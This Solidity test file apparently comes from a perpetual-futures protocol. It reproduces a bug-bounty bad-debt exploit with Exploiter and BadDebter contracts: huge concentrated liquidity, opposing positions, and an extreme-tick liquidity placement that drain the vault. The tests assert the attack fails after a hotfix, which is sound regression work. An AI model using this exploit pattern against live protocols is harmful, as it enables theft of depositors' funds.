// SPDX-License-Identifier: GPL-3.0-or-later
pragma solidity 0.7.6;
pragma abicoder v2;

import "forge-std/Test.sol";
import { UniswapV3Pool } from "@uniswap/v3-core/contracts/UniswapV3Pool.sol";

import "../helper/Setup.sol";
import "../../../contracts/ClearingHouse.sol";
import "../../../contracts/AccountBalance.sol";
import "../../../contracts/MarketRegistry.sol";
import "../../../contracts/Vault.sol";
import "../../../contracts/test/TestERC20.sol";

library Utils {
    /// @dev The maximum tick that may be passed to #getSqrtRatioAtTick computed from log base 1.0001 of 2**128
    int24 public constant MAX_TICK = -MIN_TICK;
    int24 public constant MIN_TICK = -887272;

    function getSqrtRatioAtTick(int24 tick) internal pure returns (uint160 sqrtPriceX96) {
        uint256 absTick = tick < 0 ? uint256(-int256(tick)) : uint256(int256(tick));
        require(absTick <= uint256(int256(MAX_TICK)), "T");

        uint256 ratio = absTick & 0x1 != 0 ? 0xfffcb933bd6fad37aa2d162d1a594001 : 0x100000000000000000000000000000000;
        if (absTick & 0x2 != 0) ratio = (ratio * 0xfff97272373d413259a46990580e213a) >> 128;
        if (absTick & 0x4 != 0) ratio = (ratio * 0xfff2e50f5f656932ef12357cf3c7fdcc) >> 128;
        if (absTick & 0x8 != 0) ratio = (ratio * 0xffe5caca7e10e4e61c3624eaa0941cd0) >> 128;
        if (absTick & 0x10 != 0) ratio = (ratio * 0xffcb9843d60f6159c9db58835c926644) >> 128;
        if (absTick & 0x20 != 0) ratio = (ratio * 0xff973b41fa98c081472e6896dfb254c0) >> 128;
        if (absTick & 0x40 != 0) ratio = (ratio * 0xff2ea16466c96a3843ec78b326b52861) >> 128;
        if (absTick & 0x80 != 0) ratio = (ratio * 0xfe5dee046a99a2a811c461f1969c3053) >> 128;
        if (absTick & 0x100 != 0) ratio = (ratio * 0xfcbe86c7900a88aedcffc83b479aa3a4) >> 128;
        if (absTick & 0x200 != 0) ratio = (ratio * 0xf987a7253ac413176f2b074cf7815e54) >> 128;
        if (absTick & 0x400 != 0) ratio = (ratio * 0xf3392b0822b70005940c7a398e4b70f3) >> 128;
        if (absTick & 0x800 != 0) ratio = (ratio * 0xe7159475a2c29b7443b29c7fa6e889d9) >> 128;
        if (absTick & 0x1000 != 0) ratio = (ratio * 0xd097f3bdfd2022b8845ad8f792aa5825) >> 128;
        if (absTick & 0x2000 != 0) ratio = (ratio * 0xa9f746462d870fdf8a65dc1f90e061e5) >> 128;
        if (absTick & 0x4000 != 0) ratio = (ratio * 0x70d869a156d2a1b890bb3df62baf32f7) >> 128;
        if (absTick & 0x8000 != 0) ratio = (ratio * 0x31be135f97d08fd981231505542fcfa6) >> 128;
        if (absTick & 0x10000 != 0) ratio = (ratio * 0x9aa508b5b7a84e1c677de54f3e99bc9) >> 128;
        if (absTick & 0x20000 != 0) ratio = (ratio * 0x5d6af8dedb81196699c329225ee604) >> 128;
        if (absTick & 0x40000 != 0) ratio = (ratio * 0x2216e584f5fa1ea926041bedfe98) >> 128;
        if (absTick & 0x80000 != 0) ratio = (ratio * 0x48a170391f7dc42444e8fa2) >> 128;

        if (tick > 0) ratio = type(uint256).max / ratio;

        // this divides by 1<<32 rounding up to go from a Q128.128 to a Q128.96.
        // we then downcast because we know the result always fits within 160 bits due to our tick input constraint
        // we round up in the division so getTickAtSqrtRatio of the output price is always consistent
        sqrtPriceX96 = uint160((ratio >> 32) + (ratio % (1 << 32) == 0 ? 0 : 1));
    }
}

contract Common {
    struct LiquidityPosition {
        int24 lower;
        int24 upper;
        address baseToken;
        uint256 liquidity;
    }

    ClearingHouse public clearingHouse;
    MarketRegistry public marketRegistry;
    AccountBalance public accountBalance;
    Vault public vault;
    TestERC20 public usdc;

    LiquidityPosition[] public liquidityPositions;

    constructor(
        address clearingHouseArg,
        address marketRegistryArg,
        address payable vaultArg
    ) {
        clearingHouse = ClearingHouse(clearingHouseArg);
        marketRegistry = MarketRegistry(marketRegistryArg);
        accountBalance = AccountBalance(clearingHouse.getAccountBalance());
        vault = Vault(vaultArg);
        usdc = TestERC20(vault.getSettlementToken());
    }

    function deposit(uint256 amount) public {
        usdc.approve(address(vault), amount);
        vault.deposit(address(usdc), amount);
    }

    function addLiquidity(address baseToken, uint256 quoteAmount) public returns (address pool) {
        pool = marketRegistry.getPool(baseToken);

        (, int24 tick, , , , , ) = UniswapV3Pool(pool).slot0();
        int24 space = UniswapV3Pool(pool).tickSpacing();
        int24 closestTick = tick % space;

        // below the current price, only need quote
        int24 lowerTick = tick - closestTick - space - space;
        int24 upperTick = tick - closestTick - space;
        IClearingHouse.AddLiquidityParams memory params =
            IClearingHouse.AddLiquidityParams({
                baseToken: baseToken,
                base: 0,
                quote: quoteAmount,
                lowerTick: lowerTick,
                upperTick: upperTick,
                minBase: 0,
                minQuote: 0,
                useTakerBalance: false,
                deadline: block.timestamp + 1 // solhint-disable-line not-rely-on-time
            });
        IClearingHouse.AddLiquidityResponse memory resp = clearingHouse.addLiquidity(params);

        liquidityPositions.push(
            LiquidityPosition({ lower: lowerTick, upper: upperTick, baseToken: baseToken, liquidity: resp.liquidity })
        );
    }

    function removeLiquidity() public {
        LiquidityPosition memory liquidityPosition = liquidityPositions[liquidityPositions.length - 1];
        liquidityPositions.pop();

        IClearingHouse.RemoveLiquidityParams memory params =
            IClearingHouse.RemoveLiquidityParams({
                baseToken: liquidityPosition.baseToken,
                lowerTick: liquidityPosition.lower,
                upperTick: liquidityPosition.upper,
                liquidity: uint128(liquidityPosition.liquidity),
                minBase: 0,
                minQuote: 0,
                deadline: block.timestamp // solhint-disable-line not-rely-on-time
            });
        clearingHouse.removeLiquidity(params);
    }

    function unlimitedLP(address baseToken, uint256 amount) public {
        address pool = marketRegistry.getPool(baseToken);

        int24 space = UniswapV3Pool(pool).tickSpacing();
        int24 lowerTick = -245760 + space * 999;
        int24 upperTick = -245760 + space * 1000;

        IClearingHouse.AddLiquidityParams memory params =
            IClearingHouse.AddLiquidityParams({
                baseToken: baseToken,
                base: amount,
                quote: amount,
                lowerTick: lowerTick,
                upperTick: upperTick,
                minBase: 0,
                minQuote: 0,
                useTakerBalance: false,
                deadline: block.timestamp + 1 // solhint-disable-line not-rely-on-time
            });
        IClearingHouse.AddLiquidityResponse memory resp = clearingHouse.addLiquidity(params);

        liquidityPositions.push(
            LiquidityPosition({ lower: lowerTick, upper: upperTick, baseToken: baseToken, liquidity: resp.liquidity })
        );
    }

    // used by Attack2
    function unlimitedLP(
        address baseToken,
        uint256 amount,
        int24 tick
    ) public {
        address pool = marketRegistry.getPool(baseToken);

        int24 space = UniswapV3Pool(pool).tickSpacing();
        int24 lowerTick = tick;
        int24 upperTick = tick + space;

        IClearingHouse.AddLiquidityParams memory params =
            IClearingHouse.AddLiquidityParams({
                baseToken: baseToken,
                base: amount,
                quote: amount,
                lowerTick: lowerTick,
                upperTick: upperTick,
                minBase: 0,
                minQuote: 0,
                useTakerBalance: false,
                deadline: block.timestamp + 1 // solhint-disable-line not-rely-on-time
            });

        IClearingHouse.AddLiquidityResponse memory resp = clearingHouse.addLiquidity(params);

        liquidityPositions.push(
            LiquidityPosition({ lower: lowerTick, upper: upperTick, baseToken: baseToken, liquidity: resp.liquidity })
        );
    }

    function openShort(address baseToken, uint256 amount) public returns (uint256 baseAmount, uint256 quoteAmount) {
        IClearingHouse.OpenPositionParams memory params =
            IClearingHouse.OpenPositionParams({
                baseToken: baseToken,
                isBaseToQuote: true,
                isExactInput: false,
                amount: amount,
                oppositeAmountBound: 0,
                deadline: block.timestamp, // solhint-disable-line not-rely-on-time
                sqrtPriceLimitX96: 0,
                referralCode: bytes32(0)
            });
        (baseAmount, quoteAmount) = clearingHouse.openPosition(params);
    }

    function openLong(address baseToken, uint256 amount) public returns (uint256 baseAmount, uint256 quoteAmount) {
        IClearingHouse.OpenPositionParams memory params =
            IClearingHouse.OpenPositionParams({
                baseToken: baseToken,
                isBaseToQuote: false,
                isExactInput: true,
                amount: amount,
                oppositeAmountBound: 0,
                deadline: block.timestamp, // solhint-disable-line not-rely-on-time
                sqrtPriceLimitX96: 0,
                referralCode: bytes32(0)
            });
        (baseAmount, quoteAmount) = clearingHouse.openPosition(params);
    }

    function closePosition(address baseToken, uint160 sqrtPriceLimitX96)
        public
        returns (uint256 baseAmount, uint256 quoteAmount)
    {
        IClearingHouse.ClosePositionParams memory params =
            IClearingHouse.ClosePositionParams({
                baseToken: baseToken,
                oppositeAmountBound: 0,
                deadline: block.timestamp, // solhint-disable-line not-rely-on-time
                sqrtPriceLimitX96: sqrtPriceLimitX96,
                referralCode: bytes32(0)
            });
        (baseAmount, quoteAmount) = clearingHouse.closePosition(params);
    }

    function withdrawAll() public {
        vault.withdrawAll(address(usdc));
    }
}

contract BadDebter is Common {
    constructor(
        address clearingHouseArg,
        address marketRegistryArg,
        address payable vaultArg
    ) Common(clearingHouseArg, marketRegistryArg, vaultArg) {}
}

contract Exploiter is Common {
    BadDebter public badDebter;

    constructor(
        address clearingHouseArg,
        address marketRegistryArg,
        address payable vaultArg
    ) Common(clearingHouseArg, marketRegistryArg, vaultArg) {}

    function attack2(
        address baseToken,
        int24 tick,
        uint256 usdcAmount
    ) public {
        badDebter = new BadDebter(address(clearingHouse), address(marketRegistry), address(vault));

        console.log("1. attacker deposit collaterals");
        usdc.transfer(address(badDebter), usdcAmount);
        badDebter.deposit(usdcAmount);
        deposit(usdcAmount);

        console.log("2. exploiter add a huge concentrated liquidity (below the current price)");
        uint256 hugeAmount = 8 * usdcAmount * 10**12;
        addLiquidity(baseToken, (hugeAmount * 10) / 9);

        console.log("3. exploiter open a huge short position");
        openShort(baseToken, hugeAmount);

        console.log("4. badDebter open a huge long position");
        badDebter.openLong(baseToken, hugeAmount);

        console.log("5. exploiter remove the huge concentrated liquidity");
        removeLiquidity();

        console.log("6. badDebter open a LP position at a really low price");
        badDebter.unlimitedLP(baseToken, 10000 ether, tick);

        // badDebter can close position, but the tick after the swap will be restricted
        // within the MAX_TICK_CROSSED_WITHIN_BLOCK range
        console.log("7. badDebter close position and realize a huge loss");
        badDebter.closePosition(baseToken, Utils.getSqrtRatioAtTick(Utils.MIN_TICK) + 100);

        // exploiter can close position, but the tick after the swap will be restricted
        // within the MAX_TICK_CROSSED_WITHIN_BLOCK range
        console.log("8. exploiter close position and take the profit");
        closePosition(baseToken, Utils.getSqrtRatioAtTick(Utils.MAX_TICK) - 100);

        withdrawAll();

        uint256 currentUsdc = usdc.balanceOf(address(this));
        usdc.transfer(msg.sender, currentUsdc);
    }
}

contract BadDebtAttackTest is Setup {
    uint256 public takerPrivateKey = uint256(1);
    address public taker = vm.addr(takerPrivateKey);
    uint256 public makerPrivateKey = uint256(2);
    address public maker = vm.addr(makerPrivateKey);
    uint8 public usdcDecimals;
    uint8 priceFeedDecimals;

    function setUp() public virtual override {
        Setup.setUp();

        prepareMarket();
    }

    function prepareMarket() public {
        vm.label(taker, "Taker");
        vm.label(maker, "Maker");

        // try to use the actual numbers of vONE on block 44985556 as possible

        // initial market
        pool.initialize(9659599668537315424753160997); // $0.014864800618156348
        pool.increaseObservationCardinalityNext(250);
        marketRegistry.addPool(address(baseToken), pool.fee());
        marketRegistry.setFeeRatio(address(baseToken), 1000);
        marketRegistry.setInsuranceFundFeeRatio(address(baseToken), 200000);
        exchange.setMaxTickCrossedWithinBlock(address(baseToken), 250);

        // In order to calculate mark price, we need market twap (30m) and market twap (15m)
        // Will get `OLD` revert message, if we don't forward timestamp
        vm.warp(block.timestamp + 2000);

        priceFeedDecimals = IPriceFeedDispatcher(_BASE_TOKEN_PRICE_FEED).decimals();

        // mock priceFeed
        vm.mockCall(
            _BASE_TOKEN_PRICE_FEED,
            abi.encodeWithSelector(IPriceFeedDispatcher.getDispatchedPrice.selector),
            abi.encode(1486480 * (10**(priceFeedDecimals - 8))) // $0.01486480
        );
        usdcDecimals = usdc.decimals();

        // increase settlementTokenBalanceCap to 16m
        clearingHouseConfig.setSettlementTokenBalanceCap(16_000_000 * 10**usdcDecimals);

        // mint usdc to taker and deposit to vault
        uint256 takerUsdcAmount = 5_000_000 * 10**usdcDecimals;
        usdc.mint(taker, takerUsdcAmount);
        vm.startPrank(taker);
        usdc.approve(address(vault), takerUsdcAmount);
        vault.deposit(address(usdc), takerUsdcAmount);
        vm.stopPrank();

        // mint usdc to maker and deposit to vault
        uint256 makerUsdcAmount = 400_000 * 10**usdcDecimals;
        usdc.mint(maker, makerUsdcAmount);
        vm.startPrank(maker);
        usdc.approve(address(vault), makerUsdcAmount);
        vault.deposit(address(usdc), makerUsdcAmount);
        vm.stopPrank();

        // maker add liquidity around $400k
        vm.startPrank(maker);
        clearingHouse.addLiquidity(
            IClearingHouse.AddLiquidityParams({
                baseToken: address(baseToken),
                base: 13454603 ether,
                quote: 200000 ether,
                lowerTick: -43800, // $0.012528101792108162
                upperTick: -41820, // $0.015271133775654594
                minBase: 0,
                minQuote: 0,
                useTakerBalance: false,
                deadline: block.timestamp + 1000 // solhint-disable-line not-rely-on-time
            })
        );
        vm.stopPrank();

        // initiate timestamp to enable last tick update; should be larger than Exchange._PRICE_LIMIT_INTERVAL
        vm.warp(block.timestamp + 100);
    }

    function testAttack_beforeHotfix_shouldPass() public {
        // TODO
        // deploy Exchange using the old bytecode of v2.4.0
        // enable the `if (!params.isClose) {` in line 201
    }

    // ref: https://github.com/perpetual-protocol/immunefi-14204/blob/main/test/Attack.sol
    function testAttack_afterHotfix_shouldRevert() public {
        uint256 initialUsdcAmount = 1_000_000e6;

        BadDebter badDebter = new BadDebter(address(clearingHouse), address(marketRegistry), address(vault));
        Exploiter exploiter = new Exploiter(address(clearingHouse), address(marketRegistry), address(vault));
        vm.label(address(badDebter), "BadDebter");
        vm.label(address(exploiter), "Exploiter");

        usdc.mint(address(badDebter), initialUsdcAmount);
        usdc.mint(address(exploiter), initialUsdcAmount);

        console.log("1. attacker deposit collaterals");
        badDebter.deposit(initialUsdcAmount);
        exploiter.deposit(initialUsdcAmount);

        console.log("2. exploiter add a huge concentrated liquidity (below the current price)");
        uint256 hugeAmount = 9 * initialUsdcAmount * 10**12;
        exploiter.addLiquidity(address(baseToken), hugeAmount);

        console.log("3. exploiter open a huge short position");
        exploiter.openShort(address(baseToken), hugeAmount);

        console.log("4. badDebter open a huge long position");
        badDebter.openLong(address(baseToken), hugeAmount);

        console.log("5. exploiter remove the huge concentrated liquidity");
        exploiter.removeLiquidity();

        console.log("6. badDebter open a LP position at a really low price");
        badDebter.unlimitedLP(address(baseToken), 200000 ether);

        // badDebter can close position, but the tick after the swap will be restricted
        // within the MAX_TICK_CROSSED_WITHIN_BLOCK range
        console.log("7. badDebter close position and realize a huge loss");
        badDebter.closePosition(address(baseToken), Utils.getSqrtRatioAtTick(Utils.MIN_TICK) + 100);

        // exploiter can close position, but the tick after the swap will be restricted
        // within the MAX_TICK_CROSSED_WITHIN_BLOCK range
        console.log("8. exploiter close position and take the profit");
        exploiter.closePosition(address(baseToken), Utils.getSqrtRatioAtTick(Utils.MAX_TICK) - 100);

        exploiter.withdrawAll();

        uint256 initialUsdc = initialUsdcAmount * 2;
        uint256 currentUsdc = TestERC20(usdc).balanceOf(address(exploiter));
        console.log("initialUsdc:", initialUsdc);
        console.log("currentUsdc:", currentUsdc);

        bool hasProfit = currentUsdc > initialUsdc;
        assertEq(hasProfit, false, "should be no profit");
    }

    // ref: https://github.com/perpetual-protocol/immunefi-14204/blob/main/test/Attack2.sol
    function testAttack2_afterHotfix_shouldRevert() public {
        uint256 vaultUsdcBefore = usdc.balanceOf(address(vault));

        uint256 initialUsdcAmount = 10_000_000e6;
        usdc.mint(address(this), initialUsdcAmount);

        int24 tick = -185820;
        for (int24 i = 0; i < 3; i++) {
            console.log("round");
            console.logInt(i);

            Exploiter exploiter = new Exploiter(address(clearingHouse), address(marketRegistry), address(vault));
            uint256 usdcAmount = usdc.balanceOf(address(this));
            if (usdcAmount > 0) {
                // half of usdcAmount goes to exploiter, another half goes to badDebter
                usdc.transfer(address(exploiter), usdcAmount);

                exploiter.attack2(address(baseToken), tick + 60 * i, usdcAmount / 2);
            }
        }

        uint256 vaultUsdcAfter = usdc.balanceOf(address(vault));
        console.log("vaultUsdcBefore:", vaultUsdcBefore);
        console.log("vaultUsdcAfter:", vaultUsdcAfter);

        bool protocolHasLoss = vaultUsdcBefore > vaultUsdcAfter;
        assertEq(protocolHasLoss, false, "should not have protocol loss");
    }
}
